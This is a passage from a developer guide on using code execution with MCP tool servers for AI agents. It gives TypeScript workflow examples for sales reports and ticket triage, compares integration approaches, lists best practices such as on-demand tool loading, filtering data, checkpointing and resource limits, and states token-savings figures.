    text: `Imported ${insertResult.successCount} qualified leads from spreadsheet. ${insertResult.errorCount} errors.`
  });

  return {
    totalRows: rows.length,
    qualified: qualified.length,
    imported: insertResult.successCount,
    errors: insertResult.errorCount
  };
}
```

**Token Savings:**
- Traditional: 1,050,000 tokens (full dataset through model 2x)
- Code Execution: 3,000 tokens (only summary returned)
- **Savings: 99.7%** ($15.72 per import)

### 3. Workflow Automation

**Scenario:** Automated weekly sales report generation

```typescript
import { queryRecords } from './servers/salesforce';
import { createDocument, shareDocument } from './servers/google-drive';
import { sendEmail } from './servers/sendgrid';

async function generateWeeklySalesReport() {
  const startDate = getStartOfWeek();
  const endDate = getEndOfWeek();

  // Gather data from multiple sources (parallel execution)
  const [closedWon, pipeline, activities] = await Promise.all([
    queryRecords({
      object: 'Opportunity',
      fields: ['Id', 'Name', 'Amount', 'CloseDate', 'OwnerId'],
      where: `StageName = 'Closed Won' AND CloseDate >= ${startDate} AND CloseDate <= ${endDate}`
    }),
    queryRecords({
      object: 'Opportunity',
      fields: ['Id', 'Name', 'Amount', 'StageName', 'Probability'],
      where: `StageName != 'Closed Won' AND StageName != 'Closed Lost'`
    }),
    queryRecords({
      object: 'Task',
      fields: ['Id', 'Subject', 'OwnerId', 'WhoId'],
      where: `ActivityDate >= ${startDate} AND ActivityDate <= ${endDate}`
    })
  ]);

  // Calculate metrics (in environment)
  const metrics = {
    totalRevenue: closedWon.reduce((sum, o) => sum + o.Amount, 0),
    avgDealSize: closedWon.length > 0 ? closedWon.reduce((sum, o) => sum + o.Amount, 0) / closedWon.length : 0,
    pipelineValue: pipeline.reduce((sum, o) => sum + o.Amount * (o.Probability / 100), 0),
    activitiesCompleted: activities.length,
    topDeal: closedWon.sort((a, b) => b.Amount - a.Amount)[0]
  };

  // Generate report document
  const reportContent = `
# Weekly Sales Report
**Week of ${startDate} to ${endDate}**

## Key Metrics
- Total Revenue: $${metrics.totalRevenue.toLocaleString()}
- Average Deal Size: $${metrics.avgDealSize.toLocaleString()}
- Pipeline Value: $${metrics.pipelineValue.toLocaleString()}
- Activities Completed: ${metrics.activitiesCompleted}

## Top Deal
**${metrics.topDeal.Name}** - $${metrics.topDeal.Amount.toLocaleString()}

## Closed Deals (${closedWon.length})
${closedWon.map(o => `- ${o.Name}: $${o.Amount.toLocaleString()}`).join('\n')}
  `;

  // Create Google Doc
  const doc = await createDocument({
    title: `Sales Report - Week of ${startDate}`,
    content: reportContent,
    mimeType: 'text/markdown'
  });

  // Share with team
  await shareDocument({
    documentId: doc.id,
    emails: ['sales-team@company.com'],
    role: 'reader'
  });

  // Send email notification
  await sendEmail({
    to: ['sales-team@company.com'],
    subject: `Weekly Sales Report - ${startDate}`,
    body: `The weekly sales report is ready. View it here: ${doc.webViewLink}\n\nKey highlights:\n- Revenue: $${metrics.totalRevenue.toLocaleString()}\n- Deals closed: ${closedWon.length}`
  });

  return {
    reportUrl: doc.webViewLink,
    metrics
  };
}
```

**Benefits:**
- Multiple parallel API calls
- Complex calculations in environment
- No intermediate data through model context
- Fully automated, repeatable workflow

### 4. Customer Support Automation

**Scenario:** Analyze support tickets and route to appropriate team

```typescript
import { getTickets, updateTicket, addComment } from './servers/zendesk';
import { sendMessage } from './servers/slack';
import { queryRecords } from './servers/salesforce';

async function triageNewTickets() {
  // Get unassigned tickets
  const tickets = await getTickets({
    status: 'new',
    assignee: null,
    limit: 100
  });

  // Get team assignments from Salesforce
  const teams = await queryRecords({
    object: 'Support_Team__c',
    fields: ['Name', 'Slack_Channel__c', 'Keywords__c']
  });

  // Route tickets (complex logic in environment)
  const routingResults = [];

  for (const ticket of tickets) {
    const matchedTeam = findBestTeam(ticket, teams);

    if (matchedTeam) {
      // Update ticket
      await updateTicket({
        ticketId: ticket.id,
        fields: {
          assignee_group_id: matchedTeam.zendesk_group_id,
          priority: categorizePriority(ticket),
          tags: [...ticket.tags, 'auto-routed']
        }
      });

      // Add routing comment
      await addComment({
        ticketId: ticket.id,
        body: `Auto-routed to ${matchedTeam.Name} based on ticket content.`,
        public: false
      });

      // Notify team
      await sendMessage({
        channel: matchedTeam.Slack_Channel__c,
        text: `New ticket assigned: ${ticket.subject}\nPriority: ${categorizePriority(ticket)}\nView: ${ticket.url}`
      });

      routingResults.push({
        ticketId: ticket.id,
        team: matchedTeam.Name,
        routed: true
      });
    } else {
      // Escalate unmatched tickets
      await sendMessage({
        channel: '#support-escalations',
        text: `Unable to auto-route ticket: ${ticket.subject}\nPlease assign manually: ${ticket.url}`
      });

      routingResults.push({
        ticketId: ticket.id,
        routed: false
      });
    }
  }

  return {
    totalTickets: tickets.length,
    routed: routingResults.filter(r => r.routed).length,
    escalated: routingResults.filter(r => !r.routed).length
  };
}

function findBestTeam(ticket: any, teams: any[]): any {
  const ticketText = `${ticket.subject} ${ticket.description}`.toLowerCase();

  let bestMatch = null;
  let highestScore = 0;

  for (const team of teams) {
    const keywords = team.Keywords__c.split(',').map(k => k.trim().toLowerCase());
    const score = keywords.filter(kw => ticketText.includes(kw)).length;

    if (score > highestScore) {
      highestScore = score;
      bestMatch = team;
    }
  }

  return highestScore > 0 ? bestMatch : null;
}

function categorizePriority(ticket: any): string {
  const urgentKeywords = ['urgent', 'critical', 'down', 'broken', 'not working'];
  const highKeywords = ['important', 'asap', 'needed', 'issue'];

  const text = `${ticket.subject} ${ticket.description}`.toLowerCase();

  if (urgentKeywords.some(kw => text.includes(kw))) return 'urgent';
  if (highKeywords.some(kw => text.includes(kw))) return 'high';
  return 'normal';
}
```

**Efficiency Gains:**
- Process 100 tickets in single execution
- Complex routing logic without model intervention
- Parallel Slack notifications
- Only summary returned to model

## Integration Approaches

### Approach 1: Filesystem-Based (Recommended)

**Structure:**
```
project/
‚îú‚îÄ‚îÄ servers/
‚îÇ   ‚îú‚îÄ‚îÄ google-drive/
‚îÇ   ‚îú‚îÄ‚îÄ salesforce/
‚îÇ   ‚îî‚îÄ‚îÄ slack/
‚îú‚îÄ‚îÄ skills/
‚îÇ   ‚îî‚îÄ‚îÄ common-workflows.ts
‚îú‚îÄ‚îÄ executor.ts
‚îî‚îÄ‚îÄ mcp-client.ts
```

**Benefits:**
- Natural tool discovery via `fs.readdir()`
- TypeScript type safety
- Easy debugging and testing
- Clear organization

**Implementation:**
```typescript
// executor.ts
import { executeCode } from '@anthropic/code-execution';

export async function runAgentCode(generatedCode: string) {
  return await executeCode(generatedCode, {
    filesystem: {
      '/servers': './servers',    // Mount MCP servers
      '/skills': './skills',       // Mount reusable skills
      '/tmp': '/tmp/execution',    // Temp directory
    },
    timeout: 60000,                // 60 second timeout
    memoryLimit: 512 * 1024 * 1024 // 512MB limit
  });
}
```

### Approach 2: Dynamic Module Loading

**Structure:**
```
project/
‚îú‚îÄ‚îÄ tools/
‚îÇ   ‚îú‚îÄ‚îÄ registry.ts          // Tool registry
‚îÇ   ‚îî‚îÄ‚îÄ loader.ts            // Dynamic loader
‚îú‚îÄ‚îÄ servers/
‚îÇ   ‚îî‚îÄ‚îÄ [as above]
‚îî‚îÄ‚îÄ executor.ts
```

**Benefits:**
- More control over tool loading
- Can implement permission system
- Metrics and logging per tool
- Version management

**Implementation:**
```typescript
// tools/registry.ts
interface ToolDefinition {
  name: string;
  server: string;
  path: string;
  signature: string;
  description: string;
}

class ToolRegistry {
  private tools = new Map<string, ToolDefinition>();

  register(tool: ToolDefinition) {
    this.tools.set(tool.name, tool);
  }

  search(query: string): ToolDefinition[] {
    return Array.from(this.tools.values())
      .filter(t =>
        t.name.includes(query) ||
        t.description.includes(query)
      );
  }

  async load(toolName: string): Promise<Function> {
    const tool = this.tools.get(toolName);
    if (!tool) throw new Error(`Tool not found: ${toolName}`);

    const module = await import(`../servers/${tool.server}/${tool.path}`);
    return module[toolName];
  }
}

// Expose to execution environment
globalThis.toolRegistry = new ToolRegistry();
```

**Agent Usage:**
```typescript
// Agent can search and load tools dynamically
const tools = toolRegistry.search('google drive document');
const getTool = await toolRegistry.load('getDocument');
const doc = await getTool({ documentId: 'doc-123' });
```

### Approach 3: API Gateway Pattern

**Structure:**
```
project/
‚îú‚îÄ‚îÄ api-gateway/
‚îÇ   ‚îú‚îÄ‚îÄ router.ts            // Route tool calls
‚îÇ   ‚îú‚îÄ‚îÄ middleware.ts        // Auth, logging, rate limiting
‚îÇ   ‚îî‚îÄ‚îÄ server.ts            // HTTP server
‚îú‚îÄ‚îÄ servers/
‚îÇ   ‚îî‚îÄ‚îÄ [as above]
‚îî‚îÄ‚îÄ executor.ts
```

**Benefits:**
- Centralized auth and rate limiting
- Easy to add caching layer
- Can run tools on separate infrastructure
- Horizontal scaling

**Implementation:**
```typescript
// api-gateway/router.ts
import express from 'express';

const app = express();

app.post('/tools/:server/:tool', async (req, res) => {
  const { server, tool } = req.params;
  const params = req.body;

  // Load and execute tool
  const module = await import(`../servers/${server}/${tool}`);
  const result = await module[tool](params);

  res.json(result);
});

// Agents call via HTTP
const result = await fetch('http://localhost:3000/tools/google-drive/getDocument', {
  method: 'POST',
  body: JSON.stringify({ documentId: 'doc-123' })
});
```

## Best Practices

### 1. Design for Progressive Disclosure

**‚ùå Don't load all tools upfront:**
```typescript
// This defeats the purpose
import * as googleDrive from './servers/google-drive';
import * as salesforce from './servers/salesforce';
import * as slack from './servers/slack';
// (Loads 1000+ tool definitions immediately)
```

**‚úÖ Load tools on-demand:**
```typescript
// Step 1: Discover what's available
const servers = await fs.readdir('./servers');

// Step 2: Load only what you need
if (servers.includes('google-drive')) {
  const { getDocument } = await import('./servers/google-drive/getDocument');
  const doc = await getDocument({ id: 'doc-123' });
}
```

### 2. Filter Data in the Execution Environment

**‚ùå Don't return full datasets:**
```typescript
// This wastes tokens
const allRows = await getSpreadsheet({ id: 'sheet-123' });
return allRows; // 500,000 tokens returned to model
```

**‚úÖ Filter before returning:**
```typescript
// This is efficient
const allRows = await getSpreadsheet({ id: 'sheet-123' });
const filtered = allRows
  .filter(row => row.status === 'active')
  .map(row => ({ id: row.id, name: row.name }));

return {
  total: allRows.length,
  filtered: filtered.length,
  sample: filtered.slice(0, 5) // Only return sample
};
```

### 3. Use Parallel Operations

**‚ùå Don't execute sequentially when parallel is possible:**
```typescript
const a = await fetchA();
const b = await fetchB();
const c = await fetchC();
// Takes 3x as long
```

**‚úÖ Use Promise.all for independent operations:**
```typescript
const [a, b, c] = await Promise.all([
  fetchA(),
  fetchB(),
  fetchC()
]);
// Takes 1x as long (parallel execution)
```

### 4. Implement Checkpointing for Long Operations

**‚ùå Don't lose progress on failure:**
```typescript
for (const record of largeDataset) {
  await processRecord(record);
  // If this fails on record 9,999/10,000, start over
}
```

**‚úÖ Save progress periodically:**
```typescript
let checkpoint = await loadCheckpoint();

for (const record of largeDataset) {
  if (checkpoint.processed.has(record.id)) continue;

  await processRecord(record);
  checkpoint.processed.add(record.id);

  if (checkpoint.processed.size % 100 === 0) {
    await saveCheckpoint(checkpoint);
  }
}
```

### 5. Handle Errors Gracefully

**‚ùå Don't let one failure stop everything:**
```typescript
for (const item of items) {
  await processItem(item); // One failure stops all processing
}
```

**‚úÖ Continue on errors, log failures:**
```typescript
const results = [];

for (const item of items) {
  try {
    const result = await processItem(item);
    results.push({ item, success: true, result });
  } catch (error) {
    results.push({ item, success: false, error: error.message });
    console.error(`Failed to process ${item.id}:`, error);
  }
}

return {
  total: items.length,
  successful: results.filter(r => r.success).length,
  failed: results.filter(r => !r.success)
};
```

### 6. Write Reusable Skills

**‚ùå Don't duplicate code across executions:**
```typescript
// Agent writes this logic every time
const overdue = opportunities.filter(o =>
  new Date(o.closeDate) < new Date() &&
  o.stage !== 'Closed Won'
);
```

**‚úÖ Extract to reusable skills:**
```typescript
// skills/salesforce-helpers.ts
export function getOverdueOpportunities(opportunities: Opportunity[]) {
  return opportunities.filter(o =>
    new Date(o.closeDate) < new Date() &&
    o.stage !== 'Closed Won'
  );
}

// Agent imports and reuses
import { getOverdueOpportunities } from './skills/salesforce-helpers';
const overdue = getOverdueOpportunities(opportunities);
```

### 7. Validate Generated Code

**‚ùå Don't execute unvalidated code:**
```typescript
const result = await executeCode(agentGeneratedCode);
// Could contain dangerous patterns
```

**‚úÖ Validate before execution:**
```typescript
const validation = await validateCode(agentGeneratedCode);

if (!validation.valid) {
  throw new Error(`Code validation failed: ${validation.errors.join(', ')}`);
}

const result = await executeCode(agentGeneratedCode);
```

### 8. Set Resource Limits

**‚ùå Don't allow unbounded resource usage:**
```typescript
await executeCode(code); // Could use unlimited memory/CPU
```

**‚úÖ Set explicit limits:**
```typescript
await executeCode(code, {
  timeout: 60000,              // 60 seconds max
  memoryLimit: 512 * 1024 * 1024, // 512MB max
  cpuShares: 1024,             // CPU allocation
  maxFileSize: 10 * 1024 * 1024   // 10MB max per file
});
```

### 9. Monitor and Log Execution

**‚ùå Don't execute blindly:**
```typescript
await executeCode(code);
```

**‚úÖ Track metrics and logs:**
```typescript
const startTime = Date.now();

try {
  const result = await executeCode(code);

  await logMetrics({
    duration: Date.now() - startTime,
    tokensGenerated: code.length / 4,
    success: true,
    toolsUsed: extractToolCalls(code)
  });

  return result;
} catch (error) {
  await logMetrics({
    duration: Date.now() - startTime,
    success: false,
    error: error.message
  });

  throw error;
}
```

### 10. Use TypeScript for Type Safety

**‚ùå Don't use untyped code:**
```javascript
async function getDocument(id) {
  return await callMCPTool('google_drive__get_document', { id });
}
```

**‚úÖ Use TypeScript interfaces:**
```typescript
interface GetDocumentInput {
  documentId: string;
  includeContent?: boolean;
}

interface GetDocumentResponse {
  id: string;
  title: string;
  content: string;
  mimeType: string;
}

async function getDocument(
  input: GetDocumentInput
): Promise<GetDocumentResponse> {
  return await callMCPTool<GetDocumentResponse>(
    'google_drive__get_document',
    input
  );
}
```

---

## Summary

**Code execution with MCP** transforms how AI agents interact with tools by:

1. **Reducing Token Consumption by 98%+**: From 150,000 tokens to 2,000 tokens for equivalent tasks
2. **Improving Latency by 90%+**: From 45-60 seconds to 3-5 seconds
3. **Enabling Scale**: Support 10,000+ tools without context limits
4. **Protecting Privacy**: Process PII in execution environment, not model context
5. **Supporting Complex Workflows**: Native loops, conditionals, and error handling

**When to Use:**
- Large tool sets (>50 tools)
- High-frequency operations (>500/day)
- Large data processing
- Privacy/compliance requirements
- Production deployments at scale

**Trade-offs:**
- Requires secure sandbox infrastructure (+60-80% complexity)
- Higher initial development cost ($11k-$20k)
- Ongoing maintenance overhead ($2k-$4k/month)
- Break-even at ~500 executions/day

**Best Practices:**
- Design for progressive disclosure (load tools on-demand)
- Filter data in execution environment
- Use parallel operations
- Implement checkpointing
- Handle errors gracefully
- Write reusable skills
- Validate generated code
- Set resource limits
- Monitor and log execution
- Use TypeScript for type safety

**The Golden Rule:** If your agent processes large datasets or uses many tools, code execution pays for itself through token savings and improved user experience.

---

## Related Documentation

- [MCP Builder Skill](../../.claude/skills/mcp-builder/README.md) - Guide for building MCP servers
- [Agent Orchestration](../../CLAUDE.md#agent-orchestration--parallelization) - Parallel agent execution patterns
- [Performance Optimization](../09-REFERENCE/REFERENCE_PERFORMANCE_OPTIMIZATION.md) - General optimization strategies

**External Resources:**
- [Model Context Protocol Specification](https://modelcontextprotocol.io)
- [MCP Server Examples](https://github.com/modelcontextprotocol/servers)
- [Anthropic Engineering Blog](https://www.anthropic.com/engineering)
